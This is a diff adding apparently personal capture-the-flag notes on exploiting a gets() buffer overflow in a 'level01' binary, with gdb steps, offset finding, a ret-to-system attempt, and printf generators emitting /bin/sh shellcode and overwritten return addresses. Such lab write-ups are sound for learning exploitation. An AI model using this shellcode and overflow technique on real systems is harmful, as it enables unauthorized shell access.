@@ -1,0 +1,50 @@
+#la fonction est basiquement :
+int main(void)
+{
+	char *s;
+
+	return (gets(&s));
+}
+
+#en testant par tatonement
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ne segfault pas
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + A
+coredump => debut de l adresse de retour
+=> 75 A + 1 car coredump
+
+#b after gets
+dans gdb :
+3 b gets / next / next
+on rentre comme buffer : 75 * A + A
+=> le contenu de l adresse de retour save eip a changé : 0xb7e454d3 => 0x0xb7e45400
+#on a push le /0 dans l'adresse de retour
+
+=> donc on doit ajouter notre adresse de retour après 76 * A
+
+#on essaye en ajoutant l'adresse mémoire de system 0x08048360
+
+#include <stdio.h>
+
+int main ()
+{
+    printf("(\"echo test\");AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x60\x83\x04\x08");
+}
+
+#./print > file
+#gdb level01
+#run < file
+#b next to gets
+#run
+#info frame => the eip contains 0x08048360 we are good!
+
+#we are trying to put the start  of the buffer as address 0xb7e454d3 + 75 => 0xb7e4551e
+# little endian \x1e \x55 \xe4 \xb7
+#we hade code to shell at the start of the buffer: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+
+#include <stdio.h>
+int main ()
+{
+	printf("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1e\x55\xe4\xb7");
+}
